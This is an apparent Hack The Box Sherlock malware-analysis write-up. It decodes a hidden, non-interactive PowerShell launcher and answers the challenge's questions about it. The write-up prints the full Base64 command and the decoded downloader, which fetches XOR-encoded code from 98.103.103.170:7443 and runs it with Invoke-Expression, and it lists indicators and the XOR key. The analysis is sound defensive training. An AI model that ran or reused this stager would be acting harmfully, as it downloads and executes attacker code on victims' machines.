# PowerShell_Script
### Scenario
You've come across a puzzling Base64 script, seemingly laced with malicious intent. Your mission, should you choose to accept it, is to dissect and analyze this script, unveiling its true nature and potential risks. Dive into the code and reveal its secrets to safeguard our digital realm. Good luck on this daring quest!

| Field | Details |
| --- | --- |
| Platform | [Hack The Box — Sherlocks](https://app.hackthebox.com/sherlocks/PowerShell_Script) |
| Difficulty | Very Easy |
| Category | Malware Analysis |
| Tools | CyberChef |
| Author | dmncdcco |

## Overview

The challenge provides a suspicious PowerShell script containing a Base64-encoded command. The objective is to decode it, examine its network behavior, and understand how it processes the code retrieved from a remote server.

The scenario identifies the artifact as `C:\Users\LetsDefend\Desktop\ChallengeFile\script.ps1`. This investigation examines the launcher as text. The script was **not executed**, and no remote payload was retrieved.

## Initial Analysis

The launcher begins with the following PowerShell arguments:

```powershell
powershell.exe -NoP -sta -NonI -W Hidden -Enc <Base64 data>
```

The original encoded argument is preserved below. Expand **Base64** to view it.

<details>
<summary>Base64</summary>

```text
JABXAEMAPQBOAGUAdwAtAE8AYgBqAEUAYwBUACAAUwB5AFMAVABlAE0ALgBOAEUAVAAuAFcAZQBiAEMAbABpAEUATgB0ADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7ACQAVwBDAC4ASABlAEEARABlAFIAUwAuAEEARABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAVwBjAC4AUAByAG8AeABZACAAPQAgAFsAUwB5AHMAdABlAG0ALgBOAGUAVAAuAFcARQBCAFIAZQBRAFUARQBzAHQAXQA6ADoARABFAEYAQQB1AEwAdABXAGUAYgBQAHIAbwBYAHkAOwAkAHcAYwAuAFAAUgBPAHgAWQAuAEMAcgBFAGQAZQBuAFQAaQBhAGwAUwAgAD0AIABbAFMAeQBzAFQAZQBtAC4ATgBFAHQALgBDAFIAZQBkAGUATgBUAEkAQQBsAEMAQQBjAEgARQBdADoAOgBEAGUARgBBAFUATABUAE4AZQB0AFcATwByAEsAQwByAGUAZABFAE4AVABpAEEAbABzADsAJABLAD0AJwBJAE0ALQBTACYAZgBBADkAWAB1AHsAWwApAHwAdwBkAFcASgBoAEMAKwAhAE4AfgB2AHEAXwAxADIATAB0AHkAJwA7ACQAaQA9ADAAOwBbAEMASABhAFIAWwBdAF0AJABCAD0AKABbAGMASABhAFIAWwBdAF0AKAAkAHcAYwAuAEQATwB3AE4ATABPAGEARABTAHQAcgBpAE4AZwAoACIAaAB0AHQAcAA6AC8ALwA5ADgALgAxADAAMwAuADEAMAAzAC4AMQA3ADAAOgA3ADQANAAzAC8AaQBuAGQAZQB4AC4AYQBzAHAAIgApACkAKQB8ACUAewAkAF8ALQBCAFgAbwBSACQASwBbACQASQArACsAJQAkAGsALgBMAEUAbgBHAFQASABdAH0AOwBJAEUAWAAgACgAJABCAC0AagBPAEkAbgAnACcAKQA=
```

</details>

| Argument | Full name | Purpose |
| --- | --- | --- |
| `-NoP` | `-NoProfile` | Skips loading PowerShell profile scripts. |
| `-sta` | `-STA` | Starts PowerShell in Single-Threaded Apartment mode. |
| `-NonI` | `-NonInteractive` | Disables interactive input. |
| `-W Hidden` | `-WindowStyle Hidden` | Hides the PowerShell window. |
| `-Enc` | `-EncodedCommand` | Supplies a Base64-encoded command using UTF-16LE text. |

Base64 is an encoding mechanism, not encryption. To inspect the underlying command, the encoded value after `-Enc` can be decoded in [CyberChef](https://gchq.github.io/CyberChef/) with **From Base64**, followed by **Decode text** set to **UTF-16LE (1200)**.

## Decoded PowerShell

The decoded script below has been formatted for readability while preserving the logic recorded in the investigation:

```powershell
$WC = New-Object System.NET.WebClient
$u = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'
$WC.Headers.Add('User-Agent', $u)

$WC.Proxy = [System.Net.WebRequest]::DefaultWebProxy
$WC.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials

$K = 'IM-S&fA9Xu{[)|wdWJhC+!N~vq_12Lty'
$i = 0

[char[]]$B = ([char[]](
    $WC.DownloadString("http://98.103.103.170:7443/index.asp")
)) | ForEach-Object {
    $_ -bxor $K[$i++ % $K.Length]
}

IEX ($B -join '')
```

## Tasks

### Task 0 — Script Encoding

**Question:** What encoding is the malicious script using?

- **Answer:** `Base64`

- The `-Enc` parameter passes a Base64-encoded PowerShell command. Since `EncodedCommand` expects UTF-16LE text, the Base64 data must be decoded with that character encoding to recover readable PowerShell.

### Task 1 — Hidden Window

**Question:** What parameter in the powershell script makes it so that the powershell window is hidden when executed?

- **Answer:** `-W Hidden`

- `-W Hidden` is the shortened form of `-WindowStyle Hidden`, which starts the PowerShell process with its window hidden.

### Task 2 — Non-Interactive Execution

**Question:** What parameter in the PowerShell script prevents the user from closing the process?

- **Answer:** `-NonI`

- `-NonI` is short for `-NonInteractive`. It prevents PowerShell from requesting interactive user input, **not** from being terminated by a user. The wording of the challenge question should not be taken as a literal description of the parameter's behavior.

### Task 3 — Creating the Web Client

**Question:** What line of code allows the script to interact with websites and retrieve information from them?

- **Answer:** `$WC=New-Object System.Net.WebClient`

```powershell
$WC = New-Object System.Net.WebClient
```

- The script instantiates the .NET `WebClient` class. Its `DownloadString` method is later used to retrieve remote text.

### Task 4 — User-Agent

**Question:** What is the user agent string that is being spoofed in the malicious script?

- **Answer:** `Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko`

```powershell
$u = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'
$WC.Headers.Add('User-Agent', $u)
```

- The request presents a browser-style User-Agent resembling Internet Explorer 11 on 64-bit Windows 7. It does not prove that the affected system actually runs that operating system or browser.

### Task 5 — Proxy Credentials

**Question:** What line of code is used to set the proxy credentials for authentication in the script?

- **Answer:** `$WC.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials`

```powershell
$WC.Proxy = [System.Net.WebRequest]::DefaultWebProxy
$WC.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
```

- The first line selects the default system proxy. The second uses the current security context's default network credentials for proxy authentication. These lines do not contain a hardcoded username or password.

### Task 6 — Payload Download URL

**Question:** When the malicious script is executed, what is the URL that the script contacts to download the malicious payload?

- **Answer:** `http://98.103.103.170:7443/index.asp`

```powershell
$WC.DownloadString("http://98.103.103.170:7443/index.asp")
```

- The script requests data from `98.103.103.170` over TCP port `7443`, using the path `/index.asp`. Despite the port number, the URL uses plain **HTTP**, not HTTPS.

## Additional Analysis — XOR Decoding and Execution

After retrieving the remote content, the script processes it using a repeating XOR key:

```powershell
$K = 'IM-S&fA9Xu{[)|wdWJhC+!N~vq_12Lty'
$i = 0
```

The key is applied to each character from the downloaded text:

```powershell
$_ -bxor $K[$i++ % $K.Length]
```

The modulo operation (`% $K.Length`) wraps the index to the beginning of the key whenever the end is reached. The decoded characters are collected in `$B`.

Finally, the reconstructed characters are joined and evaluated:

```powershell
IEX ($B -join '')
```

`IEX` is the alias for `Invoke-Expression`. It executes the resulting string as PowerShell code. The visible launcher does not explicitly save this next stage to disk before executing it.

Because the server response was not retrieved, the actual next-stage code and its ultimate behavior cannot be determined from this artifact alone.

## Findings and Indicators

The script's observable intended sequence is:

1. Start PowerShell with a hidden window and non-interactive input.
2. Decode the Base64 command passed through `-EncodedCommand`.
3. Configure a `WebClient` with a browser-style User-Agent and the default proxy credentials.
4. Request the remote HTTP endpoint.
5. Decode the downloaded data with repeating-key XOR.
6. Pass the decoded text to `Invoke-Expression`.

| Indicator | Value |
| --- | --- |
| IPv4 address | `98.103.103[.]170` |
| TCP port | `7443` |
| URL (defanged) | `hxxp://98.103.103[.]170:7443/index.asp` |
| Request path | `/index.asp` |
| XOR key | `IM-S&fA9Xu{[)\|wdWJhC+!N~vq_12Lty` |

**Conclusion:** The decoded PowerShell launcher functions as a downloader that XOR-decodes and executes a subsequent stage. The available code does not establish whether the download succeeded, what the remote stage contained, or whether the script was executed on a real endpoint.

---

*This write-up is intended for educational purposes and authorized security research.*
